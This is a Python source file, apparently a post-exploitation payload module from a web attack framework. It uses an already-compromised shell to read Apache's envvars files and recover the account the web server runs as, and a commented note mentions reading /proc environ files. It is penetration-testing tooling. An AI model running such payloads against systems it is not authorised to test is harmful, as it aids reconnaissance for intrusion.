import re
from plugins.attack.payloads.base_payload import base_payload

#TODO: Perform more testing
class apache_run_user(base_payload):
    '''
    Get apache process user.
    '''
    def api_read(self):
        result = {}
        result['apache_run_user'] = []
        users = []

        def parse_user_envvars (envvars_file):
            user = re.search('(?<=APACHE_RUN_USER=)(.*)', envvars_file)
            if user:
                return user.group(1)
            else:
                return ''

        apache_dir = self.exec_payload('apache_config_directory')['apache_directory']
        if apache_dir:
            for dir in apache_dir:
                users.append(parse_user_envvars(self.shell.read(dir+'envvars')))

        #TODO: ROOT users.append(parse_user_envvars(open('/proc/PIDAPACHE/environ').read()))
        users = list(set(users))
        users = [p for p in users if p != '']
        
        for user in users:
            result['apache_run_user'].append(user)

        return result
        
    def run_read(self):
        hashmap = self.api_read()
        result = []
        for k, v in hashmap.iteritems():
            k = k.replace('_', ' ')
            result.append(k.title())
            for elem in v:
                result.append(elem)
        
        
        if result == [ ]:
            result.append('Apache Run User not found.')
        return result
